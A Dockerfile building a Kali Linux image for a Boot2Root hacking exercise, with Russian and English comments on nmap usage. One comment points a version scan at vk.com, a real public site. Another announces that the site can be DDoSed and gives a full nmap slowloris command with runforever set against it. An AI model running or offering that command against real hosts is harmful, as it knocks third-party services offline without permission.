FROM	kalilinux/kali-rolling

RUN		apt update -y && \
		apt upgrade -y && \
		apt install -y dirb nmap ftp ssh vim gcc squashfs-tools

# docker build -t boot2root .
# ocker run -it --rm boot2root bash

# Kali linux is a linux distribution mainly used for hacking
# Kali usecase for Boot2Root:
# nmap -sV --top-ports 20 vk.com
# –sV Эта опция произведет более агрессивное сканирование и попытается выяснить какая версия сервисов запущена на данном узле, а также может помочь более точно определить какая ОС запущена.
#  --top-ports 20 Использование параметра «–top-ports» вместе с конкретным номером позволяет вам сканировать X наиболее распространенных портов для этого хоста, как мы можем видеть:
# https://nmap.org/man/ru/
# https://habr.com/ru/post/88064/
# Самый полезный https://habr.com/ru/post/125317/

# Можно заддостить сайт
# nmap vk.com -max-parallelism 800 -Pn -T4 --script http-slowloris --script-args http-slowloris.runforever=true
# https://securitytrails.com/blog/top-15-nmap-commands-to-scan-remote-hosts 